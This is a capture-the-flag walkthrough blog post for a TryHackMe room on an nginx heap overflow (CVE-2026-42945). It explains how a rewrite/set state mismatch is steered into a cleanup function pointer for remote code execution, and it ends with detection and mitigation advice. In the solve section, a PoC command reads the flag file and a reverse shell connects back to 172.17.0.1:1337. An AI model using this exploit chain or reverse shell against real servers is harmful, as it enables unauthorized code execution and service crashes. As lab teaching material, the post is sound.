---
title: "TryHackMe CVE-2026-42945 Nginx Rift: Heap Overflow to RCE"
date: 2026-09-14T15:47:00+05:30
lastmod: 2026-09-14T15:47:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-rift/00-thumbnail.png

categories:
  - TryHackMe

tags:
  - tryhackme
  - thm
  - rooms
  - CVE-2026-42945
  - Nginx
  - Heap Overflow
  - Memory Corruption
  - RCE
  - Binary Exploitation
  - Vulnerability Knowledge
  - Jr Penetration Tester

draft: false
description: "Walkthrough of the TryHackMe CVE-2026-42945 Nginx Rift room: the is_args two-pass state mismatch that turns a rewrite/set heap overflow into unauthenticated RCE."
---

CVE-2026-42945, nicknamed Nginx Rift, sits in the Vulnerability Knowledge module of the Jr Penetration Tester path. It is an easy room in room-mechanics terms (a prebuilt exploit driver does the heavy lifting) but the writeup underneath it is one of the better memory-corruption explainers TryHackMe has shipped. The bug is a state-mismatch, the same shape of defect I covered in the kernel context in the [Fragnesia CVE-2026-46300 page-cache LPE walkthrough](/post/thm-room-cve202646300/), and it fits alongside the other recent CVE rooms like [n8n CVE-2025-68613 expression injection](/post/thm-room-n8ncve202568613/) and the [NoScope Alf.io sandbox escape](/post/thm-room-noscoperce/).

This walkthrough follows the room top to bottom: how `rewrite` and `set` get chained in real configs, why the two-pass script engine miscounts, how the overflow is steered into a function pointer, and the actual solve that reads the flag. There is one honest surprise at the end about who the code runs as.

## Task 1: Setting up the lab

The room deploys a browser VNC desktop rather than a straight SSH box. Once the machine is up, open the Terminal on the Ubuntu desktop. The target is not the VM itself; it is a Docker container listening on the loopback interface of the VM, so all the work happens from that desktop terminal.

Confirm the container is up and note the compose project label:

```bash
sudo docker ps --filter label=com.docker.compose.project=nginx-rift
```

![docker ps showing the nginx-rift-nginx-1 container mapped on port 19321](/img/thm-rift/01-docker-ps.png)

A single container, `nginx-rift-nginx-1`, maps port `19321`. A benign request to the vulnerable `location` block returns a normal 200 with the rewritten URI proxied to the backend:

```bash
curl -s http://127.0.0.1:19321/api/users/42
  # backend ok
```

One thing worth flagging: the server banner reports `nginx/1.31.0`, which the room itself lists as a *fixed* version. The running build is clearly still vulnerable (we get code execution below), so the banner is a lab artifact and a good reminder that a version string is not proof of a patch. Configuration and the actual binary both matter.

## Task 2: How rewrite and set get chained

The two directives at the heart of the bug are `rewrite` and `set`, both routine building blocks. A typical canonicalisation config rewrites everything under `/api/` to a versioned backend path and saves the original endpoint into a variable for logging:

```nginx
location ~ ^/api/(.*)$ {
    rewrite ^/api/(.*)$ /v2/api/$1;
    set $original_endpoint $1;
}
```

Two details make this pattern reachable. First, `$1` is an unnamed PCRE capture. Second, if a `rewrite` replacement string contains a question mark, NGINX treats everything after it as a new query string. That question mark is what silently flips an internal flag, and the `set` that runs afterwards inherits it. This chaining (unnamed capture, replacement with a `?`, then a following `rewrite`, `if`, or `set`) is common in legacy URL canonicalisation and API gateway routing, so the real exposure is broader than the trigger first suggests.

## Task 3: The two-pass script engine and the is_args mismatch

At configuration load, NGINX compiles these directives into bytecode for an internal script engine that runs in two passes. The first pass (length pass) calculates the total output length so it can allocate exactly the right buffer. The second pass (copy pass) writes the bytes. The design is fast because it avoids repeated allocations, but it depends on both passes agreeing on the length.

The flaw is a single boolean, `is_args`, on `ngx_http_script_engine_t`. It records whether the engine is currently writing the query-string portion of the URL, and it controls whether captured values get URI-escaped before being written. When a `rewrite` replacement contains a `?`, the compiled bytecode calls `ngx_http_script_start_args_code`, which sets `e->is_args = 1` on the main engine and never resets it. So a following `set` that references a capture runs with `is_args` still stuck at 1.

The length pass runs on a fresh, fully zeroed sub-engine (`le.is_args == 0`), so it takes the simple path and returns the raw capture length. The copy pass runs on the main engine, where `is_args` is still 1, so it takes the URI-escaping path. For URI-safe characters the two passes agree and nothing breaks. For escapable characters, escaping expands each byte into a three-byte `%xx` form, so the copy pass writes more than the length pass reserved.

![the poc.py --cmd run firing on the first try and the flag read back through docker exec](/img/thm-rift/02-poc-cmd-flag.png)

The plus sign is the cleanest lever: each `+` becomes `%2B`. A capture of 2,000 plus signs reserves 2,000 bytes in the length pass but writes 6,000 bytes in the copy pass, a deterministic 4,000-byte overflow into the adjacent pool chunk. A second constraint falls out of the same mechanism: every overflow byte passes through `ngx_escape_uri`, so only URI-safe ASCII can be written. No null bytes, no arbitrary control characters.

## Task 4: From heap overflow to code execution

An overflow into a pool is not yet code execution. NGINX allocates per-request memory through `ngx_pool_t`, and each pool carries a linked list of cleanup callbacks (`ngx_pool_cleanup_t`), each holding a function pointer `handler` and an argument pointer `data`. When the pool is destroyed, NGINX walks the list and calls `handler(data)`. Control that list and you control a function pointer plus its argument, which makes `system()` with an attacker-supplied command string the obvious target. The cleanup pointer sits at offset 64 inside `ngx_pool_t`.

The published exploit avoids crashing on the intervening corrupted fields with a cross-request heap feng shui:

1. Open connection A with partial headers so NGINX allocates a request pool but does not process it.
2. Open connection B immediately, so its pool lands adjacent to A.
3. Complete A's headers to trigger the rewrite overflow, running out of A's pool into B's pool header and overwriting the cleanup pointer at offset 64.
4. Close connection B, which calls `ngx_destroy_pool` on the corrupted pool. The destroy path walks straight to the cleanup list and calls the attacker's handler before touching any of the other corrupted fields.

Two caveats the room is careful to state. The published PoC demonstrates RCE only with ASLR disabled at the OS level, because it relies on hardcoded heap and libc base addresses; the pointer bytes must also survive URI escaping. With ASLR enabled, the overflow remains a reliable denial-of-service: a long enough run of escapable characters crashes a worker on demand, and a loop of such requests keeps NGINX in a restart cycle.

{{< ad >}}

## Task 5: Exploitation and the flag

The room ships `poc.py` in the home directory with two modes. The command string is delivered in the request *body* (a `Content-Length: 4000` POST body), not in the URI, so unlike the overflow trigger it is not subject to URI escaping and can contain spaces, redirects, and quotes freely.

The first mode, `--cmd`, runs a single command through the `system()` handler. Rather than the reverse shell, I exfiltrated the flag directly into a marker file inside the container and then read it back with `docker exec`:

```bash
python3 poc.py --cmd 'id > /tmp/rift_proof 2>&1; cat /flag.txt >> /tmp/rift_proof; chmod 644 /tmp/rift_proof'
  # [*] Waiting for nginx on 127.0.0.1:19321...
  # [+] Connected.
  # [+] try 1/10 crashed - system("id > /tmp/rift_proof ...") executed
  # [+] Done.

sudo docker exec nginx-rift-nginx-1 cat /tmp/rift_proof
  # uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
  # THM{18_y34r_5t4t3_m15m4tch_rip5_th3_h34p}
```

The exploit landed on the first heap-offset candidate, which is typical because the lab has ASLR off and a fixed layout. The flag is **THM{18_y34r_5t4t3_m15m4tch_rip5_th3_h34p}**, and the answer mask `***{**_****_*****_********_****_***_****}` matches it exactly (word lengths 2, 4, 5, 8, 4, 3, 4).

Here is the honest surprise. The room text asserts the cleanup handler runs as root, so the marker file should be root-owned. On this lab the `id` output is `uid=65534(nobody)`: the code executed as the unprivileged NGINX worker, not root. It did not matter, because `/flag.txt` is baked into the image world-readable (`-rw-r--r-- root root`), so `nobody` could read it just fine. Do not assume the privilege level the writeup claims; check `id` yourself.

The second mode, `--shell`, generates a Python reverse shell back to the Docker bridge host `172.17.0.1:1337` (no flag overrides needed on the published setup) and drops you into an interactive `/bin/sh` inside the container:

```bash
python3 poc.py --shell
  # [*] Generated reverse shell command: python3 -c 'import socket,subprocess,os;...'
  # [*] Listening for reverse shell on port 1337...
  # [+] Connected.
$ id; hostname; cat /flag.txt
  # uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
  # 014e3347daec
  # THM{18_y34r_5t4t3_m15m4tch_rip5_th3_h34p}
```

![the poc.py --shell reverse shell landing inside the container and reading the flag](/img/thm-rift/03-reverse-shell-flag.png)

The `014e3347daec` hostname is the container ID, confirming code execution is inside `nginx-rift-nginx-1`. One operational note the room adds: the worker you land in is still subject to the master's lifecycle, so long-running commands can be killed when the next exploit attempt corrupts a sibling worker. Keep the interactive session short and grab your output promptly.

## Task 6: Detection and mitigation

The property that makes the bug exploitable also makes it loud. A successful attempt produces a burst of long, plus-padded URIs against the same vulnerable `location`, followed by a run of worker restarts. Either signal alone is suspicious; together they are unambiguous.

```bash
grep -E '\+{30,}' /var/log/nginx/access.log
```

Thirty or more consecutive `+` characters is well above any benign client. On the error side, with the master log level at `notice` or higher, a spike of `worker process N exited on signal 11` inside a short window points at crashing workers, and an `ss -t` snapshot during an attack shows many connections in `CLOSE_WAIT` and `LAST_ACK`.

For mitigation there are two layers. The upstream fix (NGINX Open Source 1.30.1 and 1.31.0, NGINX Plus R32 P6 and R36 P4) restores propagation of `is_args` into the sub-engine used by the copy pass. Where an immediate upgrade is not possible, the configuration workaround is to replace every unnamed capture in an affected `rewrite` with a named one, because named captures use a different evaluation function that is not affected by the `is_args` state:

```nginx
location ~ ^/api/(?<path>.*)$ {
    rewrite ^/api/(?<path>.*)$ /internal?migrated=true;
    set $original_endpoint $path;
}
```

The behaviour is preserved and the trigger is removed. The room rightly frames this as a temporary measure, since it is sensitive to future changes elsewhere in the codebase.

## Takeaways

Two things are worth carrying out of this room. First, state-mismatch bugs are a class, not a one-off. A single flag set in one execution path and read in another, without a reset in between, breaks an invariant that a length calculation quietly depended on. The same pattern appears kernel-side in the [Fragnesia page-cache LPE](/post/thm-room-cve202646300/), and the room notes it turns up across two-pass length-then-copy code in parsers, RPC frameworks, and query builders. When you audit performance-oriented C, the place to look is anywhere a size is computed in one pass and the data is written in another.

Second, trust nothing you did not verify on the box. The server banner reported a patched version yet the build was exploitable, and the writeup claimed root execution while `id` showed `nobody`. Neither derailed the solve, but both are the kind of assumption that quietly wastes an hour on a real engagement. Read the actual output.

Room solved 100%: 7 tasks, 7 answers.
